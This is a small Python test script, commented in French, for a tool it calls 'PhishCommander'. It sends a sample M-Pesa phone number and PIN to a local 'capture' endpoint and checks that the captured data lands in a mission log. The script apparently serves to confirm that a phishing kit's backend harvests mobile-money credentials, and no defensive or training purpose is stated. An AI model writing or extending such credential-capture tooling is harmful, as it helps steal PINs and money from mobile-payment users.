import requests
import time
import os

BASE_URL = "http://localhost:7070"

def test_phish_capture():
    print("🎣 [TEST] Simulation d'une capture PhishCommander...")
    # Payload simulant une interception de credentials
    payload = {
        "service": "MPESA",
        "user": "243810000000",
        "pin": "1234"
    }
    try:
        # Envoi vers l'API du Core
        response = requests.post(f"{BASE_URL}/login/capture-pago", data=payload)
        if response.status_code == 200:
            print("✅ Capture réussie. Données transmises au Core.")
        else:
            print(f"❌ Échec de la capture (Code: {response.status_code})")
            print("💡 Vérifiez que le Core est bien lancé sur le port 7070.")
    except Exception as e:
        print(f"❌ Erreur de connexion : {e}")

def check_logs():
    print("🔍 [TEST] Vérification des journaux Deep Analytics...")
    log_path = "logs/mission_data.json"
    if os.path.exists(log_path):
        try:
            with open(log_path, "r") as f:
                lines = f.readlines()
                if lines:
                    print(f"📄 Dernier log enregistré : {lines[-1].strip()}")
                else:
                    print("⚠️ Le fichier de log est vide.")
        except Exception as e:
            print(f"❌ Impossible de lire les logs : {e}")
    else:
        print(f"❌ Fichier de log introuvable à l'emplacement : {log_path}")

if __name__ == "__main__":
    test_phish_capture()
    time.sleep(1)
    check_logs()
